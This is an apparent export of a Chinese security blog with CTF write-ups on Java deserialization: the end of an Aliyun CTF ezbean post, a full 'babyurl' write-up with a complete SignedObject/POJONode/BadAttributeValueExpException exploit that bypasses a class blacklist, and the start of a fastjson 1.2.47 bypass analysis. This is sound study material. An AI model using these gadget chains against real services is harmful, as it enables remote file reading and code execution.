class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>运行exp生成base64编码串，全部url编码</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/22.png" class><p>Yakit做好反连，执行谈计算器的命令。</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/23.png" class><h3 id="疑惑与思考"><a href="#疑惑与思考" class="headerlink" title="疑惑与思考"></a>疑惑与思考</h3><p>这里发包三次才会成功，前两次在控制台的时候可以看到，是发生报错的</p><img src="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/24.png" class><p>它说JMXServiceURL类没有默认的无参构造方法。</p><p>网上看到有文章解释这个问题，fastjson反序列化的时候会先从一个map中，会判断这个类是否在map中，如果在，就直接拿出来反序列化，如果不在，就把它放到map里，然后判断是否存在无参构造方法。</p><p>这里发包三次分别为</p><p>将RMIConnector存入map，将JMXService存入map，将这两个类直接拿出来反序列化。</p><p>感兴趣可以自己调试一下。</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>最近这段时间的学习效率确实不是太高，往后得多安排时间学了。后续打算还是刷一些java题，或者复现一些CMS漏洞，积累一些经验和看代码的能力。</p><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_42585535/article/details/130738288">https://blog.csdn.net/qq_42585535/article/details/130738288</a></p><p><a href="https://www.freebuf.com/vuls/365414.html">https://www.freebuf.com/vuls/365414.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ctf </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023极客巅峰babyurl-初识二次反序列化</title>
      <link href="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近也不怎么看CTF了，主要是分析java和打一些渗透靶场，其实也没干多少事情。极客巅峰这个比赛本来我也是不知道的，也没有参加。比赛的时候组里的同学就发给我这一道java题，心想也算了解过一些java反序列化的东西，也没做过什么java反序列化的题目，就尝试一下吧。结果第一次听说二次反序列化，才有了下文。</p><h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h2><p>附件就是一个jar包，用jd-gui也可以拖到idea反编译一下。是一个springboot框架，逻辑也比较简单，分析一下。</p><p>先看路由：</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class><p>反序列化的入口点，只不过我们需要注意的是它使用的是自定义的输入流的类MyObjectInputStream。看看这个类实现了一个怎样的逻辑</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class><p>重写了resolveClass方法，里面添加了一些黑名单，里面正好有题目中的两个模板类。</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" class><p>就是一个读文件的功能。再看两个模板类，它们都继承了Serializable接口</p><p>URLHelper</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" class><p>重写了readObject方法，看来入口类就是它了。调用了任意类的visitUrl方法，并把结果写进文件里。</p><p>URLVisiter</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" class><p>通过指定url访问其内部资源然后返回。代码逻辑还是很好懂的。</p><h2 id="0x03-漏洞利用分析"><a href="#0x03-漏洞利用分析" class="headerlink" title="0x03 漏洞利用分析"></a>0x03 漏洞利用分析</h2><p>预期利用很简单，反序列化URLHelper类，它里面的url和visiter属性都可控，可以调用URLVisiter的visitUrl方法，通过file协议，或者访问内网地址将flag的内容读取到file文件中，然后通过file路由回显到客户端。有效代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLHelper</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);</span><br><span class="line"><span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">aaa</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.yancao.ctf.bean.URLHelper&quot;</span>).getDeclaredField(<span class="string">&quot;visiter&quot;</span>);</span><br><span class="line">aaa.set(handler,urlVisiter);</span><br></pre></td></tr></table></figure><p>但是在黑名单中有URLHelper的全限定名，如果你序列化的是这个类，基本上你是没法绕的。所以就要用到一种新的（对我来说）绕过技巧——二次反序列化。</p><h3 id="二次反序列化探寻之旅"><a href="#二次反序列化探寻之旅" class="headerlink" title="二次反序列化探寻之旅"></a>二次反序列化探寻之旅</h3><p>顾名思义，二次反序列化就是在服务端第一次反序列化的时候，通过某些类可以进行二次反序列化。而在第二次反序列化的时候是没有限制恶意类的，可以通过这个绕过黑名单。当然也可以用来写内存马（不太了解）</p><h4 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h4><p>能够进行二次反序列化的类必然是重写了readObject方法的，也不卖关子了，就是SignedObject这个用于签名的类。看它的readObject方法</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" class><p>如果content属性可控，那就完美了。看它的构造方法</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" class><p>第一个参数就是可以序列化的类，在这个构造函数里面对它序列化，并且赋值给content属性。这就完全符合二次反序列化的条件。有效代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">KeyPairGenerator keyPairGenerator;</span><br><span class="line">keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line"><span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line"><span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(恶意类, privateKey, signingEngine);</span><br></pre></td></tr></table></figure><p>用于签名的私钥等其他两个参数不需要深究，当个模板用就可以。那么如何调用getObject方法</p><h4 id="Jackson触发getter流程分析"><a href="#Jackson触发getter流程分析" class="headerlink" title="Jackson触发getter流程分析"></a>Jackson触发getter流程分析</h4><p>getObject也是一种getter方法，jackson的序列化是可以触发getter的。</p><p>到这里可能会有些疑问，为啥会扯到jackson包里面的类？pom也没有导入相关依赖啊？</p><p>确实，pom文件里只有一些spring-boot-starter，spring-framework有关的依赖</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" class><p>外部库中有jackson的相关jar包。因为jackson是org.springframework.boot:spring-boot-starter-test:jar:2.7.14:test的依赖，所以自然也会下载它的jar包。</p><p>回归正题，分析流程</p><p>写了两个测试类，主要功能就是用jackson序列化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>, <span class="number">28</span>);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="type">ObjectWriter</span> <span class="variable">writer</span> <span class="operator">=</span> mapper.writer();</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> writer.writeValueAsString(person);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>writeValueAsString方法就是本题用到的关键方法，跟进调试看一下</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" class><p>然后跟进到_writeValueAndClose里面</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" class><p>跟进到这个序列化函数里，后面就类似于封装了，层层调用</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" class><p>然后调用到最终的这个serializeFields方法，</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" class><p>有getter方法的调用，那么就可以通过writeValueAsString方法来调用getObject方法。</p><p>那么哪些地方可以调用writeValueAsString方法呢？</p><h4 id="POJONode"><a href="#POJONode" class="headerlink" title="POJONode"></a>POJONode</h4><p>查找用法</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" class><p>调用的地方很少，所以可以直接锁定这个方法，这个方法又是谁调用的呢？好像只有一处</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" class><p>来到了BaseJsonNode的toString方法。这个类是一个抽象类，POJONode就属于它的一个实现类。那么现在问题就变成了怎么调用toString方法。在CC5中有一个再适合不过的类了。</p><h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>它是jdk自带的类，并且它还重写了readObject方法</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" class><p>在这个方法里面调用了toString，valObj属性值我们可以通过反射去改。那么把它当作入口的类，到此整条链分析结束。</p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException#readObject-&gt;POJONode#toString-&gt;ObjectWriter#writeValueAsString-&gt;SignedObject#getObject-&gt;二次反序列化-&gt;URLHelper#readObject-&gt;URLVisiter#visitUrl</span><br></pre></td></tr></table></figure><h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>这里有一个坑，整条链子理顺之后写完exp运行发现是会报错的。</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" class><p>报了一个这样的错误，其实exp的代码是没有问题的，当时困扰了我好久，然后找到文章说是在BaseJsonNode的writeReplace方法</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" class><p>报错在这里</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" class><p>这个方法是Java序列化机制的一部分，它是在对象进行序列化时被调用的特殊方法。它的存在可以默认改变它的序列化行为，可能会偏离我们的预期结果。所以解决办法就是重写一个BaseJsonNode或者用反射删除。这里直接Copy一位师傅用反射删除writeReplace方法的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">    <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">    jsonNode.removeMethod(writeReplace);</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    jsonNode.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要导入相关依赖：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.25</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-题目复现"><a href="#0x04-题目复现" class="headerlink" title="0x04 题目复现"></a>0x04 题目复现</h2><p>java题目还是比较好的。有jar包，可以自己本地复现。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yancao.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLHelper;</span><br><span class="line"><span class="keyword">import</span> com.yancao.ctf.bean.URLVisiter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CtfAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchAlgorithmException, SignatureException, InvalidKeyException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//恶意类</span></span><br><span class="line">        <span class="type">URLHelper</span> <span class="variable">urlHelper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLHelper</span>(<span class="string">&quot;http://127.0.0.1:8888/flag.txt&quot;</span>);</span><br><span class="line">        <span class="type">URLVisiter</span> <span class="variable">urlVisiter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLVisiter</span>();</span><br><span class="line">        urlHelper.visiter = urlVisiter;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用于二次反序列化的类</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除 pojoNode 的 writeReplace</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">jsonNode</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> jsonNode.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">            jsonNode.removeMethod(writeReplace);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            jsonNode.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aaa</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> aaa.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, pojoNode);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(ser);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(ser.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>D盘的tmp文件夹下有flag文件</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png" class><p>在此目录下用python开个web服务</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png" class><p>exp运行是一串很长的base64，get传进去会报错，则需要url编码一下。</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png" class><p>接着访问file路由</p><img src="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png" class><p>可以读取到flag。</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>之前没怎么做过java题，复现这道题的时候开头也确实比较迷。网上也只能找到两三个这道题的wp，一般都是直接甩个exp就没了，有的exp写的也并不是很完整，比如那个踩坑的地方。然后就网上看文章，自己用idea慢慢调。总之收获还是蛮大的。据说这道题和之前阿里云CTF的java题的思路很像。阿里云CTF的java题我也保存有附件，搭好环境在idea吃灰呢。看来得找个时间复现一下了。</p><p>另外非常感谢师傅们的文章</p><p>参考链接：</p><p><a href="https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/">https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/</a></p><p><a href="https://www.viewofthai.link/2023/07/22/%e5%b7%85%e5%b3%b0%e6%9e%81%e5%ae%a2ctf-2023-%e4%b8%8a-babyurl/">https://www.viewofthai.link/2023/07/22/%e5%b7%85%e5%b3%b0%e6%9e%81%e5%ae%a2ctf-2023-%e4%b8%8a-babyurl/</a></p><p><a href="https://xz.aliyun.com/t/12509">https://xz.aliyun.com/t/12509</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 二次反序列化 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson反序列化&lt;=1.2.47绕过</title>
      <link href="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/"/>
      <url>/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>上篇文章主要总结了fastjson在1.2.24版本的漏洞利用，在后续的版本中，fastjson做了一个漏洞的修复，导致原先的payload用不了了。本篇文章主要分析fastjson&lt;&#x3D;1.2.47版本下的绕过，重点分析在不开启<strong>AutoTypeSupport</strong>下的漏洞利用。</p><h2 id="0x02-fastjson在1-2-25版本的修复"><a href="#0x02-fastjson在1-2-25版本的修复" class="headerlink" title="0x02 fastjson在1.2.25版本的修复"></a>0x02 fastjson在1.2.25版本的修复</h2><p>我们可以先尝试打一下原来的payload</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/1.png" class><p>报错了，提示反序列化的类不支持，看一下它的源码是怎么修复的。</p><img src="/2023/07/19/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-2-47%E7%BB%95%E8%BF%87/2.png" class><h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType"></a>checkAutoType</h3><p>这里由原来的loadClass替换为checkAutoType函数，其实其他地方都大差不差，都是在这个checkAutoType函数中做了检测和限制。在后续高版本fastjson的修复也都是在这个函数中做进一步的优化。重点来分析一下checkAutoType函数内部的代码逻辑，直接看注释。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;  <span class="comment">//也就是@type对应的键值，要反序列化的类，当然它是不为null</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//将内部类的$替换为. 这行代码不重要</span></span><br><span class="line">        <span class="comment">//expectClass是期望类，默认也是为空的，所以默认代码逻辑是不会走到这个if里的</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123; <span class="comment">//autoTypeSupport布尔型，默认为false</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;  <span class="comment">//遍历白名单，如何匹配到了就类加载</span></span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123; <span class="comment">//遍历黑名单，如果匹配到了就抛出异常</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//上面if条件都不满足，所以会走到这里</span></span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<span class="comment">//从缓存里面找 这个类是否在缓存里</span></span><br><span class="line">        <span 